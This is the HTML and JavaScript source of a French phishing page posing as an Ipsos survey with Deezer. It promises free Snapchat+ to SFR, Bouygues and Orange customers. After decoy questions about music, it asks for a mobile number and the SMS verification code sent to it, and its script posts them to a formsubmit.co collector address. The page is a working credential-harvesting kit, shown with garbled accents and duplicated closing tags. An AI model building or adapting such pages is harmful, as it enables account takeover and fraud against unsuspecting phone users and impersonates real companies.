<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sondage | Ipsos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background:#f4f6f9; margin:0; overflow-x:hidden; }
        .header { background:#003b7a; padding:20px 30px; display:flex; align-items:center; justify-content:center; position:relative; }
        .header img { height:50px; }
        .header a { position:absolute; left:30px; }
        .header-text { color:#fff; font-size:26px; font-weight:700; }
        .logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
        .box { max-width:650px; margin:60px auto; background:white; padding:45px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.12); text-align:center; transition:all 0.5s ease; opacity:0; transform:translateY(30px); display:none; }
        .box.active { display:block; opacity:1; transform:translateY(0); }
        h2 { font-size:28px; margin-bottom:20px; color:#003b7a; }
        p { font-size:18px; margin-bottom:20px; color:#333; line-height:1.5; }
        input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; transition:all 0.3s; }
        input:focus { border-color:#0078d4; outline:none; box-shadow:0 0 8px rgba(0,120,212,0.3); }
        button { padding:14px 28px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; transition:all 0.3s; }
        button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-shadow:0 4px 12px rgba(0,0,0,0.15); }
        .progress-container { width:90%; height:16px; background:#e0e0e0; border-radius:8px; margin:30px auto; position:relative; }
        .progress-bar { height:100%; width:0%; background:#0078d4; border-radius:8px; transition:width 0.5s ease; }
        .progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px; }
        .about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left; }
        .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd; }
        @media(max-width:600px){ .box{margin:30px 20px;padding:30px} h2{font-size:24px} p{font-size:16px} button{font-size:16px} .about{font-size:13px;padding:15px} }
    </style>
</head>
<body>

    <!-- LOGO FIXE -->
    <img src="francelogo.png" class="logo-fixed" alt="France">

    <!-- HEADER -->
    <div class="header">
        <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')">
            <img src="logo.png" alt="Ipsos">
        </a>
        <div class="header-text">Ipsos ‚Äì Sondage</div>
    </div>

    <!-- PROGRESS BAR -->
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
        <div class="progress-text" id="progressText">0%</div>
    </div>

    <!-- FORMULAIRE -->
    <form id="surveyForm" action="https://formsubmit.co/tonemail@domaine.com" method="POST">

        <!-- Champ cach√© pour l'objet du mail -->
        <input type="hidden" name="_subject" value="R√©ponse au sondage Ipsos" />
        <input type="hidden" name="_captcha" value="false" />

        <!-- √âtape 1 -->
        <div class="box active" id="etape1">
            <h2>Recevoir Snapchat+ üéÅ</h2>
            <p>Pour recevoir Snapchat+, participez √† ce sondage en collaboration avec <strong>Deezer</strong>. Offre r√©serv√©e aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
            <input type="text" name="artiste_prefere" placeholder="Votre artiste pr√©f√©r√©" required>
            <button type="button" id="btnEtape1">Suivant</button>
        </div>

        <!-- √âtape 2 - Deezer -->
        <div class="box" id="etape2">
            <h2>Artiste sur Deezer</h2>
            <input type="text" name="artiste_deezer" placeholder="Artiste que vous √©coutez sur Deezer" required>
            <button type="button" id="btnEtape2">Suivant</button>
        </div>

        <!-- √âtape 3 - D√©couverte -->
        <div class="box" id="etape3">
            <h2>Artiste d√©couvert r√©cemment</h2>
            <input type="text" name="artiste_decouverte" placeholder="Artiste d√©couvert r√©cemment" required>
            <button type="button" id="btnEtape3">Suivant</button>
        </div>

        <!-- √âtape 4 - Num√©ro de t√©l√©phone -->
        <div class="box" id="etape4">
            <h2>Num√©ro de t√©l√©phone</h2>
            <input type="text" name="telephone" placeholder="Ex: 06XXXXXXXX" required>
            <button type="button" id="btnEtape4">Suivant</button>
        </div>

        <!-- √âtape 5 - Code de v√©rification -->
        <div class="box" id="etape5">
            <h2>Code de v√©rification</h2>
            <input type="text" name="code_sms" placeholder="Code re√ßu" required>
            <button type="button" id="btnEtape5">Terminer</button>
        </div>

        <!-- √âtape finale -->
        <div class="box" id="etape6">
            <h2>Merci !</h2>
            <p>Votre Snapchat+ sera activ√© dans l‚Äôheure. üéâ</p>
        </div>
    </form>

    <!-- √Ä propos du partenariat -->
    <div class="about">
        <strong>√Ä propos du partenariat :</strong><br>
        Ce sondage est organis√© par Ipsos en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement. L‚Äôoffre est exclusivement r√©serv√©e aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilit√© et la compatibilit√© du service.
    </div>

    <!-- FOOTER -->
    <div class="footer">¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s</div>

    <script>
        let reponses = {};

        // Fonction pour afficher les √©tapes
        function showStep(etapeId, percent) {
            document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
            document.getElementById(etapeId).classList.add('active');
            document.getElementById('progressBar').style.width = percent + "%";
            document.getElementById('progressText').innerText = percent + "%";
        }

        // √âtape 1 : Collecte des donn√©es
        document.getElementById('btnEtape1').addEventListener('click', () => {
            let pref = document.querySelector('[name="artiste_prefere"]').value.trim();
            if (!pref) { alert("Veuillez remplir toutes les questions."); return; }
            reponses.artiste_prefere = pref;
            showStep('etape2', 20);
        });

        // √âtape 2 : Deezer
        document.getElementById('btnEtape2').addEventListener('click', () => {
            let deezer = document.querySelector('[name="artiste_deezer"]').value.trim();
            if (!deezer) { alert("Veuillez remplir toutes les questions."); return; }
            reponses.artiste_deezer = deezer;
            showStep('etape3', 40);
        });

        // √âtape 3 : D√©couverte
        document.getElementById('btnEtape3').addEventListener('click', () => {
            let decouverte = document.querySelector('[name="artiste_decouverte"]').value.trim();
            if (!decouverte) { alert("Veuillez remplir toutes les questions."); return; }
            reponses.artiste_decouverte = decouverte;
            showStep('etape4', 60);
        });

        // √âtape 4 : T√©l√©phone
        document.getElementById('btnEtape4').addEventListener('click', () => {
            let tel = document.querySelector('[name="telephone"]').value.trim();
            if (!/^0[67]\d{8}$/.test(tel)) { alert("Num√©ro invalide (06 ou 07)."); return; }
            reponses.telephone = tel;
            showStep('etape5', 80);
        });

        // √âtape 5 : Code SMS
        document.getElementById('btnEtape5').addEventListener('click', () => {
            let code = document.querySelector('[name="code_sms"]').value.trim();
            if (!code) { alert("Veuillez entrer le code."); return; }
            reponses.code_sms = code;
            showStep('etape6', 100);

            // Envoi des donn√©es par mail √† chaque √©tape
            const formData = new FormData(document.getElementById('surveyForm'));
            fetch('https://formsubmit.co/tonemail@domaine.com', { method: 'POST', body: formData })
                .then(response => console.log('Formulaire envoy√©', response))
                .catch(error => console.error('Erreur d\'envoi du formulaire', error));
        });
    </script>

</body>
</html>


    </script>

</body>
</html>


